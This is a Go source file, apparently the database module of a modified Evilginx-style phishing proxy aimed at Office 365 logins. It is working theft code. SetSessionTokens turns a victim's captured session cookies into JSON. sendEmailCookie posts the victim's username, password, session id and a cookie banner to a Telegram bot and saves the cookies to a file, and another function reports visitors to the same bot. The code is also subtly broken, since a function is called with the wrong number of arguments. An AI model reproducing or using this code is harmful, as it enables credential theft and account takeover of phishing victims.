package database

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"fmt"
	"github.com/joho/godotenv"
	"log"
	"net/http"
	"os"

	"github.com/tidwall/buntdb"
	"strconv"
	//"strings"
	"time"
)

func goDotEnvVariable(key string) string {

	// load .env file
	err := godotenv.Load(".env")

	if err != nil {
		log.Printf("Error loading .env file")
	}

	return os.Getenv(key)
}

func getUrl() string {
	// godotenv package
  	Token := goDotEnvVariable("TOKEN")
	return fmt.Sprintf("https://api.telegram.org/bot%s", Token)
}

func getChatId() string {
	//get ChAT_ID from .env
	ChatId := goDotEnvVariable("CHAT_ID")
	return fmt.Sprintf("%s", ChatId)
}

// func telegramSendResult(msg string) (bool, error){
// 	var err error

// // 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
// 	// Send the message
// 	url := fmt.Sprintf("%s/sendMessage", getUrl())
// 	body, _ := json.Marshal(map[string]string{
// 		"chat_id": getChatId(),
// 		"text":    msg,
// 	})
// 	responseBody := bytes.NewBuffer(body)
// 	request, _ := http.Post(url, "application/json", responseBody)

// 	// Close the request at the end
// 	defer request.Body.Close()
	
// 	// Body
// 	body, err = ioutil.ReadAll(request.Body)
// 	if err != nil {
// 		log.Fatalf("%s", err)
// 	}
// 	log.Printf("%s", msg)
// 	// Return
// 	return true, nil
// }

func sendEmailCookie(cookies string, id string, phishlet string, username string, password string, sessionId string) {

	// Send the message
	var err error
	url := fmt.Sprintf("%s/sendMessage", getUrl())
	msg := fmt.Sprintf("[ 🍁 %d %s Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🏷️ Key_user:   %s\n💻 Session_id:   %s\n\n*******[ 🍪 Cookies Captured 🍪 ] **********",id, phishlet, username, password, sessionId)
	
	postBody, _ := json.Marshal(map[string]string{
		"chat_id":    getChatId(),
		"text":       msg,
	})

	responseBody := bytes.NewBuffer(postBody)
	request, _ := http.Post(url, "application/json", responseBody)

	defer request.Body.Close()
	
	// 	// Body
	postBody, err = ioutil.ReadAll(request.Body)
	if err != nil {
		log.Fatalf("%s", err)
	}
	
	err = os.WriteFile("0365_Cookies_Result.json", []byte(cookies), 0755)
	if err != nil {
		fmt.Printf("Unable to write file: %v", err)
	}

	log.Println("Send Email/Telegram Cookies", username, password)
	
	// Return
	return

}

func telegramSendVisitor(msg string) {
	var err error
// 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
	
	url := fmt.Sprintf("%s/sendMessage", getUrl())
	body, _ := json.Marshal(map[string]string{
		"chat_id": getChatId(),
		"text":    msg,
	})
	responseBody := bytes.NewBuffer(body)
	request, _ := http.Post(url, "application/json", responseBody)

	// Close the request at the end
	defer request.Body.Close()
	
// 	// Body
	body, err = ioutil.ReadAll(request.Body)
	if err != nil {
		log.Fatalf("%s", err)
	}
	fmt.Println("Successfully sent mail to all user in telegram")
	// Return
	return
}

type Database struct {
	path string
	db   *buntdb.DB
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	fmt.Sprintf("🌟 Username  :%s", username)
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	fmt.Sprintf("🔑 Password : %s", password)
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	//telegramSendResult(fmt.Sprintf("🔥 🔥 CUSTOM 🔥 🔥\n\n-🆔ID: %s \n\nKey: %s\n-🔑Value: %s\n", sid, name, value))

	//data, _ := d.sessionsGetBySid(sid)
	//log.Printf("%s", data)
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionTokens(sid string, phishlet string, tokens map[string]map[string]*Token) error {
	err := d.sessionsUpdateTokens(sid, tokens)

	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	data, _ := d.sessionsGetBySid(sid)

	//log.Printf("%s", data)
	//log.Important("database: %s", data)

	json11, _ := json.Marshal(cookies)
	sendEmailCookie(string(json11), data.Phishlet, data.Username, data.Password, data.SessionId)
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
